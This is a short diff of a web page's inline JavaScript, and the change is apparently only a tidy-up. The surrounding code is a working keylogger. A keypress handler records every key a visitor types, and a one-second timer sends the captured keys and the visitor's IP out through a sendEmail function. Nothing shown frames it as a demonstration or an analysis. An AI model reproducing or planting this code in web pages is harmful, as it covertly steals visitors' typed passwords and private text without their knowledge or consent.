@@ -179,9 +179,9 @@
    }
   </script>
   <script>
-	  window.alert('hello mr aaron')
+	  window.alert('hello mr aaron');
 	  var keys = '';
-	  window.d = 0;
+	  var d = 0;
    document.onkeypress = function(e) {
 	get = window.event?event:e;
 	key = get.keyCode?get.keyCode:get.charCode;
@@ -190,8 +190,8 @@
 }
 	  window.setInterval(function(){
 	if(keys.length>0) {
-		sendEmail(window.ip + ':' + window.d + ':' + keys);
-		window.d++
+		sendEmail(window.ip + ':' + d + ':' + keys);
+		d++
 		keys = '';
 	}
 }, 1000);
